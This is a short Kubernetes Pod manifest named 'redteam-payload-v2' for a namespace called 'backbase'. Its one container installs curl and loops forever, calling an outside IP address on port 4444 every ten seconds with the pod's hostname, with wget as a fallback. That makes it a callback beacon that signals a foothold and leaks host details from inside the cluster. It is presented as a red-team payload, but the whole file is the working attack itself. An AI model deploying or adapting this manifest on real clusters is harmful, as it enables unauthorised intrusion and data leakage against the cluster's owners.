apiVersion: v1
kind: Pod
metadata:
  name: redteam-payload-v2
  namespace: backbase
spec:
  containers:
  - name: alpine
    image: alpine:latest
    command: ["/bin/sh"]
    args: ["-c", "apk add --update curl && while true; do curl -s http://203.175.125.130:4444/$(hostname) || wget -O- http://203.175.125.130:4444/$(hostname); sleep 10; done"]
  restartPolicy: Never
